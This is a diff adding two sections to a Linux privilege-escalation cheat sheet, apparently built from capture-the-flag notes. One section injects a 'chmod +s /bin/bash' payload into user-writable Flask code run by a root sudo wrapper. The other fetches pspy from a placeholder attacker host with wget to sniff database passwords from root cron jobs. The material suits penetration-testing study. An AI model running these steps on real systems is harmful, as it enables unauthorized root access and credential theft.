@@ -189,6 +189,65 @@ User www-data may run the following commands on THM-Chal:
 * However you cannot `sudo perl /home/itguy/backup.pl` with no password
 * Need to use the absolute paths if they are specified that way!!!
 
+#### Sudo wrapper runs user-writable app code
+
+If `sudo -l` allows a wrapper script as root, read the wrapper and check whether it changes into or executes files writable by your user. A root-owned wrapper can still be exploitable when the application code it runs is owned by a low-privileged user.
+
+Example sudo rule:
+
+```text
+User USER may run the following commands on HOST:
+    (root) NOPASSWD: /usr/bin/flask_password_changer
+```
+
+Wrapper script:
+
+```bash
+cat /usr/bin/flask_password_changer
+```
+
+```bash
+#!/bin/bash
+cd /opt/password_change_app
+/usr/local/bin/flask run --host 127.0.0.1 --port 9000 --no-debug
+```
+
+Check whether the app is writable:
+
+```bash
+ls -la /opt/password_change_app/app.py
+# -rw-r--r-- 1 USER USER 134 Jan 16 2025 /opt/password_change_app/app.py
+```
+
+Add a root-executed payload to the imported app code:
+
+```python
+from flask import Flask, render_template
+import os
+os.system("chmod +s /bin/bash")
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+    return render_template("index.html")
+```
+
+Run the sudo wrapper and use SUID bash:
+
+```bash
+sudo /usr/bin/flask_password_changer
+ls -la /bin/bash
+/bin/bash -p
+id
+```
+
+Successful root context:
+
+```text
+uid=1001(USER) gid=1001(USER) euid=0(root) egid=0(root) groups=0(root),1001(USER)
+```
+
 **Taking advantage of SUID files**
 
 * Some administrators will set the SUID bit manually to allow certain programs to be run as them.
@@ -1650,6 +1709,31 @@ EOF
 /bin/bash -p
 id
 ```
+
+#### Cron process leaks credentials on the command line
+
+Use `pspy` to watch root cron jobs and other processes that low-privileged users cannot normally list with full command-line context. Database backup jobs are especially worth watching because scripts often pass passwords directly to clients such as `mysql` or `mysqldump`.
+
+```bash
+cd /tmp
+wget http://ATTACKER_IP/pspy64
+chmod +x pspy64
+./pspy64
+```
+
+Example credential leak:
+
+```text
+CMD: UID=0 | mysqldump -u USER -pPASSWORD soplanning
+```
+
+Try the recovered password for local user switching if the username matches a system account:
+
+```bash
+su USER
+```
+
+This is a credential disclosure TTP, not a direct root exploit. Use it to move from a service user to a real account, then re-check `id`, home directory access, and `sudo -l`.
 
 #### Cron script owned by low-priv user but run as root
 
